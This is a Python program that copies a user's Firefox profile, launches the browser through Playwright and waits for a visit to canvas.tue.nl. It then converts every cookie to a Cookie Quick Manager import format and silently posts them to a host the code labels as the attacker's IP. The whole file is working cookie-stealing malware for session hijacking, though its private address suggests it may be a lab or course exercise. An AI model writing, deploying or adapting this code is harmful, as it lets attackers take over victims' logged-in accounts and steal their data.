import os
import sys
import glob  # Unix path finder
import time
import shutil  # High level file operations
import tempfile  # Generates temporary files and directories under /tmp/
import asyncio  # Async operations
from playwright.async_api import async_playwright  # Firefox automation tester
import aiohttp  # Async HTTP client

# sys.frozen = True after bundled with pyinstaller
if getattr(sys, 'frozen', False):
    # Use ms-playwright from pyInstaller's temp folder
    base_path = sys._MEIPASS
# Set up environment variable for playwright firefox
os.environ["PLAYWRIGHT_BROWSERS_PATH"] = os.path.join(base_path, "ms-playwright")


# Find where the default profile of a user is
def get_default_profile_path():
    # Possible Firefox profile base paths
    profile_roots = [
        # Path to firefox profiles if firefox is installed natively (apt)
        os.path.expanduser("~/.mozilla/firefox"),
        # Path to firefox profiles if snap version of firefox is installed
        os.path.expanduser("~/snap/firefox/common/.mozilla/firefox"),
    ]

    for root in profile_roots:
        if os.path.isdir(root):
            # Fetch the default user profile, e.g. .default, .default-release
            profiles = glob.glob(os.path.join(root, "*.default*"))
            if profiles:
                return profiles[0]
            else:
                print("No profile found")


# Make a copy of the default firefox profile
def copy_default_profile():
    # Get the path to the default profile
    default_profile = get_default_profile_path()
    # Create a temporary directory to store copied profile
    temp_dir = tempfile.mkdtemp()
    # Create a copied profile directory inside temporary directory
    copied_profile_dir = os.path.join(temp_dir, "profile")
    # Copy the default profile into temporary directory
    shutil.copytree(
        default_profile,
        copied_profile_dir,
        # Lock files are used to indicate that a profile is in use and to prevent multiple instances -
        # of Firefox from simultaneously trying to modify the same profile files. They cannot be -
        # copied using shutil. So we must skip them here.
        ignore=shutil.ignore_patterns("lock", "parent.lock", ".parentlock", "places.sqlite-wal")
    )

    return temp_dir, copied_profile_dir


# Calls steal_cookies once the trigger website has been visited
async def monitor_url(context, target_url):

    async def handle_page(page):
        # Check matching url on navigation
        def on_navigate(frame):
            url = frame.url
            if target_url in url:
                asyncio.create_task(steal_cookies(context))

        page.on("framenavigated", on_navigate)

    # Calls handle_page on a newly opened page
    context.on("page", handle_page)

    # Attach listeners to all existing pages
    for page in context.pages:
        await handle_page(page)

    # Async daemon persists until browswer closes
    while True:
        await asyncio.sleep(1)


# Steals cookies from the current context
async def steal_cookies(context):
    # Fetch all cookies
    cookies = await context.cookies()
    # This function converts the cookies fetched in the playwright format t o
    def convert_cookie(cookie):
        # Determine if it's a session cookie
        is_session = cookie.get("expires", -1) in [-1, 0]

        # Construct the base URL for "Host raw"
        scheme = "https" if cookie.get("secure") else "http"
        host = cookie["domain"].lstrip(".")
        url = f"{scheme}://{host}/"

        # Convert playwright cookie format to that recognized by
        # The browswer extention Cookie Quick Manager, which 
        # loads custom cookies into a browswer. 
        return {
            "Host raw": url,
            "Name raw": cookie["name"],
            "Path raw": cookie["path"],
            "Content raw": cookie["value"],
            "Expires": "At the end of the session" if is_session else time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(cookie["expires"])),
            "Expires raw": "0" if is_session else str(cookie["expires"]),
            "Send for": "Encrypted connections only" if cookie.get("secure") else "Any connection",
            "Send for raw": str(cookie.get("secure", False)).lower(),
            "HTTP only raw": str(cookie.get("httpOnly", False)).lower(),
            "SameSite raw": "no_restriction",
            "This domain only": "Valid for host only" if not cookie["domain"].startswith(".") else "Valid for subdomains",
            "This domain only raw": str(not cookie["domain"].startswith(".")).lower(),
            "Store raw": "firefox-default",  # or change to match your actual store if needed
            "First Party Domain": ""
        }

    # Construct cookies in json format for Cookie Quick Manager
    transformed_cookies = [convert_cookie(cookie) for cookie in cookies]

    try: 
        upload_data = {
            "filename": "cookies.json",
            "json_data": transformed_cookies
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                # Attacker host ip
                "http://10.30.36.236:8000/upload",
                json=upload_data,
                timeout=5
            ) as response:
                await response.text()

    except:
        pass

# Main function
async def main():
    temp_dir, copied_profile_dir = copy_default_profile()

    async with async_playwright() as p:
        context = await p.firefox.launch_persistent_context(
            user_data_dir=copied_profile_dir,
            headless=False,
            # executable_path="/usr/lib/firefox-esr/firefox-esr",
        )

        monitor_task = None

        try:
            # Start monitoring for URL
            monitor_task = asyncio.create_task(monitor_url(context, "https://canvas.tue.nl"))

            while True:
                try:
                    # Check if the pages can be accessed
                    _ = context.pages
                    # Check if there are still pages left
                    if not context.pages:
                        break
                except Exception as e:
                    break

                # Async daemon that keeps running
                await asyncio.sleep(1)

        finally:

            # Make sure monitor_task daemon is killed
            if monitor_task and not monitor_task.done():
                monitor_task.cancel()
                try:
                    await monitor_task
                except asyncio.CancelledError:
                    pass

            try:
                # This does not happen when browsers are closed, but keep for safety
                await context.close()
            except Exception as e:
                shutil.rmtree(temp_dir, ignore_errors=True)

            # Clean up the temporary directory for profile in /tmp/
            shutil.rmtree(temp_dir, ignore_errors=True)

# Launch firefox and silently wait for opportunity to steal cookies
if __name__ == "__main__":
    asyncio.run(main())
